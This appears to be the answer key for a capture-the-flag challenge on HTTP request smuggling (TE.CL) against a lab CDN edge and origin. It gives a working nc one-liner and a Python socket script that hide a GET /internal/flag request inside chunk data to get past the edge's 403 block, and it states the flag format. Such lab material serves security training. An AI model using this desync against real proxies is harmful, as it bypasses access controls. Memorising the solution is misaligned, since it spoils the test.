# http/smuggle-te-cl — SmuggleTeCl (location-locked, high)

**EdgeMesh CDN**: raw-TCP edge front (`:8080`) → origin app (`:8081`). **Raw sockets only** (arch §8).

**Bug (TE.CL):** for requests carrying **both** `Transfer-Encoding: chunked` and `Content-Length`, the FRONT frames the message by **TE** (it de-chunks the body), but forwards the request with TE **removed** and the **client's `Content-Length` preserved verbatim** instead of the true de-chunked length. The origin frames by CL → everything after the CL-counted prefix of the de-chunked body becomes the origin's next request.
**Lock:** the origin serves `GET /internal/flag`; the edge answers **403** for every request it parses whose path starts with `/internal` (the front parses all subsequent requests too, so hide the smuggled request **inside the chunk data**, past the CL boundary).

## Intended path (exact bytes, single connection)
```sh
printf 'POST /home HTTP/1.1\r\nHost: victim.target.lab:8119\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n41\r\nAAAAGET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n\r\n0\r\n\r\n' | nc victim.target.lab 8119
```
- One chunk of `0x41` = 65 bytes: `AAAA` (the 4 bytes the origin will count as the first request's body per the forwarded `Content-Length: 4`) followed by the 61-byte smuggled request.
- The front consumes the whole chunked message (including the smuggled request) as chunk data; the origin reads only `AAAA` as the body and parses the rest as a new request.
- You receive two responses: the `POST /home` response, then the smuggled `GET /internal/flag` response containing the flag.

Python:
```python
import socket
smug = b"GET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n"  # 61 bytes
chunk = b"AAAA" + smug                                                          # 65 = 0x41
p = (b"POST /home HTTP/1.1\r\nHost: victim.target.lab:8119\r\n"
     b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
     + hex(len(chunk))[2:].encode() + b"\r\n" + chunk + b"\r\n0\r\n\r\n")
s = socket.create_connection(("victim.target.lab", 8119)); s.sendall(p)
import time; time.sleep(1); print(s.recv(65536).decode("latin1"))
```

**Flag:** `DSLTV{HTTP-SmuggleTeCl-<9 digits>}` (from the origin's `/internal/flag`, only reachable via the desync).
